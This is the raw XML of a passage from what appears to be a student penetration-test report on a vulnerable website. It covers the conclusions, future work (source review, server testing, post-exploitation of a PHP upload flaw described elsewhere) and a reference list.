      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>security is</w:t>
      </w:r>
      <w:r w:rsidR="006020E5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> vital to a company,</w:t>
      </w:r>
      <w:r w:rsidR="004816C4" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006020E5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>however</w:t>
      </w:r>
      <w:r w:rsidR="004816C4" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, a report such as this is only useful if it identifies vulnerabilities and provides constructive feedback on how to fix them. </w:t>
      </w:r>
      <w:r w:rsidR="00B06D2B" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>This report does serve a secondary purpose as well. That is to inform the company as to why these vulnerabilities are so detrimental to their company.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B28BE3F" w14:textId="01E50BD3" w:rsidR="00B06D2B" w:rsidRPr="00292DEC" w:rsidRDefault="00B06D2B" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>When it comes to the identification of vulnerabilities it can be difficult to find all of them. This is mainly because any one website can contain tens of thousands of lines of code, and plugins that contain thousands more. All it takes is for one of these lines to contain a flaw and the whole website could be compromised. Therefore, the use of tools is essential when looking for these vulnerabilities as they can scan thousands of lines a second looking for known flaws. This, combined with a robust methodology that covers ever</w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> angle of entry into a web application, can improve, but not guarantee, the chances of finding any vulnerabilities.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5995C379" w14:textId="22A1CE6F" w:rsidR="00790807" w:rsidRPr="00292DEC" w:rsidRDefault="00B06D2B" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">As for the company as a whole. It is first important to understand that security is not a static thing. Just because something is secure today, does not mean it will be secure tomorrow. </w:t>
      </w:r>
      <w:r w:rsidR="00EB5E5C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Similarly, just because something has not been hacked, does not mean it is secure. System security is a fluid thing where any day a vulnerability could be found in a piece of software that has been on the market for years, a software patch could create a vulnerability in a brand new system, and a security patch could secure a point of entry in a vulnerable system. This is why it is important to understand that this report can become out of date within months of being </w:t>
      </w:r>
      <w:r w:rsidR="00C57A00" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">compiled, </w:t>
      </w:r>
      <w:r w:rsidR="00EB5E5C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">and while the advice given within is vital it cannot be seen as a solution. It must be seen as part of a package of tools to increase the security of the web application. This report </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>provides</w:t>
      </w:r>
      <w:r w:rsidR="00EB5E5C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> a valuable jump off point, securing key points of entry into the system. But only with constant vigilance by administrators and staff, combined with periodical check-ups of the system, can the system begin to be considered “secure”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1858D73B" w14:textId="0270EAE9" w:rsidR="005635CE" w:rsidRPr="00292DEC" w:rsidRDefault="00466D0E" w:rsidP="00790807">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00072743" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">he sheer volume of vulnerabilities present on the website means that it will take a huge amount of time and effort </w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">to check, verify and solve each problem individually </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">While </w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>there are tools that can speed up checking a website for flaws</w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">there </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>are no such tools for actually fixing these flaws.</w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Realistically, this website is so riddled with vulnerabilities that it </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">may </w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">be easier to recreate it from scratch rather than trying to patch these flaws. </w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Also</w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">, since there are multiple errors on almost every page, with many vulnerabilities being in the fundamental </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">functions </w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">of the website, it would take a lot of effort to patch them all. </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>It is</w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> easier to implement good security during the creation of </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>web application.</w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is why consideration should be given to recreating the website from the ground up, </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>scrapping the code currently used. This option will be costly and would involve disruption as services are switched over to a new system</w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r w:rsidR="002A342E" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>ut with a web application so riddled with flaws it is impossible to guarantee that all vulnerabilities have been found.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018CD9AC" w14:textId="5E9ABDC3" w:rsidR="00790807" w:rsidRDefault="00B16117" w:rsidP="00B16117">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Future Work</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F47C17" w14:textId="5046487B" w:rsidR="00582609" w:rsidRPr="00292DEC" w:rsidRDefault="00582609" w:rsidP="00B16117">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>The possibilities listed below are ideas that could be implemented if it is decided not to recreate the website, and instead invest more in resolving the vulnerabilities present. If</w:t>
      </w:r>
      <w:r w:rsidR="004816C4" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> given more time and resources for this </w:t>
      </w:r>
      <w:r w:rsidR="00EB5E5C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>project,</w:t>
      </w:r>
      <w:r w:rsidR="004816C4" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB5E5C" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>there are</w:t>
      </w:r>
      <w:r w:rsidR="005635CE" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> some extra steps that </w:t>
      </w:r>
      <w:r w:rsidR="003C6D7D" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">could </w:t>
      </w:r>
      <w:r w:rsidR="005635CE" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>be taken.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716ED946" w14:textId="3FCAFD01" w:rsidR="00B16117" w:rsidRPr="00292DEC" w:rsidRDefault="00582609" w:rsidP="00B16117">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Firstly</w:t>
      </w:r>
      <w:r w:rsidR="005635CE" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> the section that </w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">involved manually sifting through lines of code. It is obvious that source code analysis can greatly increase the effectiveness of the analysis of the web application. However, it is one of the most </w:t>
      </w:r>
      <w:r w:rsidR="00C75FD8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>time-consuming</w:t>
      </w:r>
      <w:r w:rsidR="00B0145F" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> sections and suffers from diminishing returns. Obvious flaws can be picked up quickly after a brief scan of the page</w:t>
      </w:r>
      <w:r w:rsidR="00C75FD8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00DC215A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> while</w:t>
      </w:r>
      <w:r w:rsidR="00C75FD8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> more subtle flaws can take far longer to identify. This does not diminish the usefulness of finding these vulnerabilities, but it means they are not always cost effective. Hence why it was decided not to </w:t>
      </w:r>
      <w:r w:rsidR="007F6196" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>perform</w:t>
      </w:r>
      <w:r w:rsidR="00C75FD8" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> this step to that degree in this report.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CB67D6" w14:textId="624D1FCE" w:rsidR="00C75FD8" w:rsidRPr="00292DEC" w:rsidRDefault="00C75FD8" w:rsidP="00B16117">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>Another section that could benefit from greater scrutiny is the web server. While it was checked for vulnerable services</w:t>
      </w:r>
      <w:r w:rsidR="002775F5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="002775F5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>an</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> attempt to compromise those services</w:t>
      </w:r>
      <w:r w:rsidR="002775F5" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> was not made. This meant that any services</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> which could</w:t>
      </w:r>
      <w:r w:rsidR="00DC215A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> possibly</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> lead to more vulnerabilities being identified</w:t>
      </w:r>
      <w:r w:rsidR="00DC215A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>, were not tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00DC215A" w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> This is mainly because there were no obvious vulnerabilities present, however, it is always possible something was missed which closer scrutiny would identify.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43CA1D8B" w14:textId="42555BF9" w:rsidR="00DC215A" w:rsidRPr="00292DEC" w:rsidRDefault="00DC215A" w:rsidP="00B16117">
      <w:pPr>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00292DEC">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:t>One final area that could be expanded upon can be found in section 2.10. In this section an explanation can be found as to how to exploit a php file upload vulnerability. However, once rood access was obtained, no further attempt to use it was made. This was mainly because it was considered to be unnecessary to prove that command line access could be used maliciously. Despite that, an attempt could be made to use that command line access to further enumerate the system and discover any other possible vectors of attack that could not be identified without it.</w:t>
      </w:r>
    </w:p>
    <w:bookmarkStart w:id="58" w:name="_Toc58836607" w:displacedByCustomXml="next"/>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="minorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorBidi"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:smallCaps w:val="0"/>
          <w:color w:val="auto"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:id w:val="566773658"/>
        <w:docPartObj>
          <w:docPartGallery w:val="Bibliographies"/>
          <w:docPartUnique/>
        </w:docPartObj>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="311927C4" w14:textId="4F71EA77" w:rsidR="006E34CB" w:rsidRDefault="00341658" w:rsidP="00341658">
          <w:pPr>
            <w:pStyle w:val="Heading1"/>
            <w:numPr>
              <w:ilvl w:val="0"/>
              <w:numId w:val="0"/>
            </w:numPr>
            <w:ind w:left="431"/>
          </w:pPr>
          <w:r>
            <w:t>References</w:t>
          </w:r>
          <w:bookmarkEnd w:id="58"/>
          <w:r w:rsidR="00F832BA">
            <w:t xml:space="preserve"> 1</w:t>
          </w:r>
        </w:p>
        <w:bookmarkStart w:id="59" w:name="_Toc58836608" w:displacedByCustomXml="next"/>
        <w:sdt>
          <w:sdtPr>
            <w:rPr>
              <w:rFonts w:eastAsiaTheme="minorEastAsia" w:cstheme="minorBidi"/>
              <w:b w:val="0"/>
              <w:bCs w:val="0"/>
              <w:caps w:val="0"/>
              <w:color w:val="auto"/>
              <w:sz w:val="22"/>
              <w:szCs w:val="22"/>
            </w:rPr>
            <w:id w:val="-573587230"/>
            <w:bibliography/>
          </w:sdtPr>
          <w:sdtEndPr/>
          <w:sdtContent>
            <w:p w14:paraId="2D174B9E" w14:textId="780D2DC4" w:rsidR="00E46A6E" w:rsidRPr="00E338BC" w:rsidRDefault="00E46A6E" w:rsidP="00EB748F">
              <w:pPr>
                <w:pStyle w:val="Heading2"/>
                <w:numPr>
                  <w:ilvl w:val="0"/>
                  <w:numId w:val="0"/>
                </w:numPr>
                <w:ind w:left="578" w:hanging="578"/>
                <w:jc w:val="left"/>
                <w:rPr>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
              </w:pPr>
              <w:r>
                <w:rPr>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t>References</w:t>
              </w:r>
              <w:bookmarkEnd w:id="59"/>
              <w:r w:rsidR="00F832BA">
                <w:rPr>
                  <w:lang w:eastAsia="en-US"/>
                </w:rPr>
                <w:t xml:space="preserve"> </w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="71BCB5D3" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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Malekos Smith, Z., Lostri, E. and A. Lewis, J., 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>The Hidden Costs Of Cybercrime</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Mcafee.com. Available at: &lt;https://www.mcafee.com/enterprise/en-us/assets/reports/rp-hidden-costs-of-cybercrime.pdf&gt; [Accessed 11 October 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="6F986027" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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Ico.org.uk. 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Penalties</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Available at: &lt;https://ico.org.uk/for-organisations/guide-to-data-protection/guide-to-law-enforcement-processing/penalties/&gt; [Accessed 29 October 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="43ADA5CA" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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ptsecurity, 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Web Applications Vulnerabilities And Threats: Statistics For 2019</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] Ptsecurity.com. Available at: &lt;https://www.ptsecurity.com/ww-en/analytics/web-vulnerabilities-2020/&gt; [Accessed 10 October 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="77BE0654" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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Stuttard, D., Pinto, M. and Pauli, J., 2012. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>The Web Application Hacker's Handbook</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. Indianapolis, Ind.: John Wiley &amp; Sons.</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="5005BD73" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E"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Talalaev, A., 2020. </w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:i/>
                  <w:iCs/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>Website Hacking Statistics In 2020</w:t>
              </w:r>
              <w:r>
                <w:rPr>
                  <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
                  <w:color w:val="000000"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                  <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
                </w:rPr>
                <w:t>. [online] WebARX. Available at: &lt;https://www.webarxsecurity.com/website-hacking-statistics-2018-february/&gt; [Accessed 11 October 2020].</w:t>
              </w:r>
            </w:p>
            <w:p w14:paraId="0741C537" w14:textId="77777777" w:rsidR="00E46A6E" w:rsidRDefault="00E46A6E" w:rsidP="00EB748F">
              <w:pPr>
